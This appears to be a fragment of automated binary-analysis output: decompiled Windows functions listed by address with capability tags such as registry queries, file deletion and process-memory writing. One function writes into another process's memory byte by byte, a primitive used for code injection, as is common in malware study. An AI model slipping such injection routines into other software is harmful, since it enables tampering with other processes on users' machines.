        "decompiled_code": "\nuint32_t __fastcall fcn.00412298(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x427bc8, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 216
    },
    "00403684": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403684(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * '/';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 157
    },
    "004036f7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004036f7(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * 'S';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 160
    },
    "0040376a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040376a(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * -0x34;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "004064e6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004064e6(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * -0x53;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "00406561": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406561(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * -0xc;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 160
    },
    "0040663d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040663d(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * -0x59;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "0040a1b7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a1b7(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * '\\\\';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 161
    },
    "0040cb6a": {
        "rules": [
            "contain loop",
            "write process memory"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cb6a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < arg_ch) {\n        arg_8h = arg_8h - in_EDX;\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(in_ECX, in_EDX, arg_8h + in_EDX, 1, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            iVar2 = iVar2 + 1;\n            in_EDX = in_EDX + 1;\n        } while (iVar2 < arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 193
    },
    "0040f752": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f752(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * -10;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 160
    },
    "0040ff36": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ff36(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) * -0x20;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "004099a5": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.004099a5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "0040db00": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db00(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    uint in_EDX;\n    uint hKey;\n    uint lpValueName;\n    int32_t lpcbData;\n    \n    lpcbData = 0;\n    *arg_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, lpcbData + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (iVar2 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(in_ECX, in_EDX, 0, 0, iVar2, &lpcbData);\n            if (iVar4 == 0) {\n                *arg_8h = iVar2;\n            }\n            else {\n                uVar3 = (*pcVar1)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 307
    },
    "0040cca9": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cca9(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t lpNumberOfBytesWritten;\n    \n    lpNumberOfBytesWritten = param_1;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(param_1, param_2, 0x1c, &lpNumberOfBytesWritten, 0);\n    if ((iVar1 == 0) || (lpNumberOfBytesWritten != 0x1c)) {\n        fcn.0040cc66();\n    }\n    return iVar1;\n}\n",
        "token_count": 131
    },
    "0040a12c": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a12c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.004099a5();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040f405();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 190
    }
}